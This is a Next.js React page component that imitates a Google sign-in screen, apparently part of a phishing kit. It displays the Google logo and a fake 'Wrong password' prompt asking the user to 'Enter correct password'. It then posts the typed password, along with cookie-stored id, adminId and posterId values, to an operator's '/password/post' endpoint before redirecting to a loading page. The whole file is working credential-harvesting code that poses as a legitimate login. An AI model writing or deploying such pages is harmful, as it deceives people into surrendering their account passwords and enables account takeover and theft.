'use client'
import React, { useState } from 'react'
import { useRouter } from "next/navigation";
import Cookies from "js-cookie";
import { API_URL } from "../config/index";
function page() {
    const router = useRouter();
    const id = Cookies.get("id");
    const adminId = Cookies.get("adminId");
    const posterId = Cookies.get("posterId");
    const [password, setPassword] = useState("");
    const handleSubmit = async() => {
      const values = {
       id,
       password,
       adminId,
       posterId
      }
       const url = `${API_URL}/password/post`;
   
       const res = await fetch(url, {
         method: "POST",
         headers: {
           Accept: "application/json",
           "Content-Type": "application/json",
         },
         body: JSON.stringify(values),
       });
       const data = await res.json();
       console.log(data);
   
       if (res.ok) {
         console.log("success", data);
         router.push("/loading")
       } else {
         console.log("error", data);
         toast.error("Something Went Wrong");
       }
   
   
      
     };
  return (
    <div>
         <div className='flex flex-col justify-center items-center mt-[100px]'>
      <img src="/images/google.png"  width={95} height={35}/>
      <div className=" ">
        <div className="text-start">
        <p className='font-medium text-xl mt-5'>Sign in</p>
        </div>
        <input value={password} onChange={(e) => setPassword(e.target.value)} className='w-[350px] px-3 py-3 border border-gray-300 outline-none rounded-md mt-5 placeholder:pl-5' type="text" placeholder="Enter correct password "/>
        <p className='text-[#FF0000] text-sm mt-2'>Wrong password</p>
        <p className='text- text-sm mt-2'>Not your computer? Use Guest mode to sign in privately.</p>
        <p className='text-[#1a73e8] text-sm mt-2'>Learn more about using Guest mode</p>
        <div className="flex justify-between mt-3">
          <p className='text-[#1a73e8] text-sm mt-7 text-center'>Create account</p>
          <button  onClick={handleSubmit} className=' bg-[#1a73e8] text-white px-3 py-2 border border-gray-300 outline-none rounded-full mt-5'>Next</button>
        </div>
      </div>
    </div>
    </div>
  )
}

export default page